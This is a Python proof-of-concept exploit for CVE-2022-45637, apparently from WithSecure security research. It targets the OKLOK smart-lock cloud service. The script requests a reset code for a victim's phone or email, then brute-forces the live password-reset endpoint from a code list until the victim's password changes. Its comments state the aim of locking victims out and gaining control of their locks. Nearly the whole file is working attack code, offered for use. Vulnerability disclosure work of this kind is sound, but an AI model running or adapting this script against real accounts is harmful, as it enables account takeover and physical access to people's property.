#!/bin/python3

# This script is a PoC for CVE-2022-45637
# Crafted by Abdullah Ansari while at WithSecure

# It is designed to reset a target user's password locking them out of thier account and granting an attacker access to the locks owned by them

import sys
import os

current_script_dir = os.path.dirname(__file__)
script_modules_dir = os.path.join(current_script_dir, "..", "script_modules")
sys.path.append(script_modules_dir)

import requests
from collections import OrderedDict
import json
import signkey_generator
import helper_functions
import js2py
import time
import getpass

proxy = helper_functions.get_proxy()

def send_code_phone(victim_phone_number):

    api_code_endpoint = "http://service.oklok.com.cn/app/login/getCountryCode"

    # Only works on US phone numbers for now

    request_body = {"phone":victim_phone_number,"countryCode":"+1","notCheck":True,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()

    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "login/getCountryCode")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = ""
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"
    
    session = requests.Session()

    api_request = requests.Request('POST', api_code_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    return parsed_response["code"]

def send_code_email(victim_email):

    api_code_endpoint = "http://service.oklok.com.cn/app/login/getCode"

    request_body = {"phone":victim_email,"notCheck":True,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()

    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "login/getCode")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = ""
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"
    
    session = requests.Session()

    api_request = requests.Request('POST', api_code_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    return parsed_response["code"]

def change_victim_password(victim_username, desired_password, verification_code):

    api_resetpw_endpoint = "http://service.oklok.com.cn/app/login/resetPwd"

    request_body = {"phone":victim_username,"pword":desired_password,"code":verification_code,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()

    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "login/resetPwd")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = ""
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"
    
    session = requests.Session()

    api_request = requests.Request('POST', api_resetpw_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    return parsed_response["code"]

def main():

    print("\n[*] CVE-2022-45637 PoC")
    print("[*] Author: Abdullah Ansari")

    if len(sys.argv) != 3:

        sys.exit('\nUsage: python3 CVE-2022-45637_PoC.py <p (phone number) or e (email address)> <victim_email/phone>')
    
    else:
    
        victim_username_type = str(sys.argv[1])
        victim_username = sys.argv[2]
        desired_password = getpass.getpass('\nDesired Password: ')

    if(victim_username_type == "p"):
        send_code_phone(victim_username)
    elif(victim_username_type == "e"):
        send_code_email(victim_username)
    else:
        print("\n[-] Please enter a valid username type! [p/e]")

    with open("verification_codes.txt", "r") as verification_codes:

        list_of_codes = verification_codes.read().split("\n")

    print("\n[*] Starting bruteforce attack!")

    for code in list_of_codes:

        if(change_victim_password(victim_username, desired_password, code) == 0):

            print("\n[+] The verification code was found! [" + code + "]")
            print("\n[+] The password for \"" + victim_username + "\" was set to \"" + desired_password + "\"")
            sys.exit()

        else:

            pass

if __name__ == '__main__':
    main()
